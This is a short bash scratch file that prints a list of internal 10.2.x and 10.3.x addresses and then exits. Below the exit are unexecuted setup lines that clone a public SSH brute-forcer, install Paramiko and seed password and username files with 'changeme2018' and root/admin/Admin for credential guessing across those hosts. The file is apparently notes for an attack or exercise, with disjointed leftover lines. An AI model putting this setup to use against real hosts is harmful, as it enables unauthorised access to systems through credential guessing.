#!/bin/bash
for i in `seq 1 50`; do
	echo "10.2.$i.10"
	echo "10.2.$i.20"
	echo "10.2.$i.30"
	echo "10.2.$i.40"
	echo "10.2.$i.50"
	echo "10.2.$i.60"
	echo "10.3.$i.10"
	echo "10.3.$i.20"
done

exit

apt-get install git python-pip
git clone https://github.com/R4stl1n/SSH-Brute-Forcer.git
pip install Paramiko
cd SSH-Brute-Forcer/src/
echo "changeme2018" > passwords.txt
echo "root\nadmin\nAdmin" > usernames.txt

for i in `seq 1 50`; do
	echo $i
done
